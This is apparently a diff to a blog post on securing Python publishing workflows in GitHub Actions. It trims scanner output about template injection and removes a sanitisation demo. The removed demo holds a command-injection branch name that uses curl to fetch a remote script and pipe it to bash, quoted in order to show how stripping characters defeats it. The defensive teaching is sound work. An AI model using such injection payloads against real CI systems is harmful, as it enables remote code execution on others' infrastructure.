@@ -59,6 +59,7 @@ These steps (and the other best practices mentioned below) will significantly re
 
 Don’t wait--start securing your Python publishing workflows today.
 
+TODO add all reviewers and link to their githubs...
 note: many thanks to xxxx for reviewing this post for accuracy and accessibility!
 </div>
 
@@ -169,19 +170,7 @@ $ zizmor .github/workflows/publish-pypi.yml
 
 error[template-injection]: code injection via template expansion
    --> path/here/pyosMeta/.github/workflows/publish-pypi.yml:97:7
-    |
- 97 |       - name: Upload artifact signatures to GitHub Release
-    |         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ this step
- 98 |         env:
-...
-102 |         # sigstore-produced signatures and certificates.
-103 | /       run: >-
-104 | |         gh release upload
-105 | |         '${{ github.ref_name }}' dist/**
-106 | |         --repo '${{ github.repository }}'
-    | |__________________________________________^ github.ref_name may expand into attacker-controllable code
-    |
-    = note: audit confidence → High
+github.ref_name may expand into attacker-controllable code
 ```
 
 ## Other security measures you can consider
@@ -229,35 +218,6 @@ jobs:
           echo "Running script for branch: $SAFE_BRANCH"
 ```
 
-<div class="notice" markdown="1">
-How cleaning the branch name works:
-
-1.	echo $GITHUB_REF: Outputs the branch name.
-2.	sed 's/[^a-zA-Z0-9_\-\/]//g': Removes any characters that are not letters, numbers, dashes, underscores, or slashes, ensuring the branch name is safe.
-
-Try It:
-
-Test how sanitization works by running this command in your shell:
-the branch name:  $({curl,-sSfL,raw.githubusercontent.com/test/test/123456d8daa0b26ae0c221aa4a8c20834c4dbfef2a9a14/dummyfile.sh} | bash)
-
-
-```bash
-# Input string
-input='$({curl,-sSfL,raw.githubusercontent.com/test/test/123456d8daa0b26ae0c221aa4a8c20834c4dbfef2a9a14/dummyfile.sh} | bash)'
-
-# Sanitization step
-sanitized=$(echo "$input" | sed 's/[\$\{\}\|\(\)]//g')
-
-# Output the sanitized string
-echo "Original: $input"
-echo "Sanitized: $sanitized"
-```
-
-This strips out any characters that can be used to call shell commands.
-
-</div>
-
-The good news here is that if you use a release-based workflow as discussed earlier, then you don't have to worry about branch names. And yes you can always make a release from a different branch!
 
 ## Lock down GitHub permissions
 
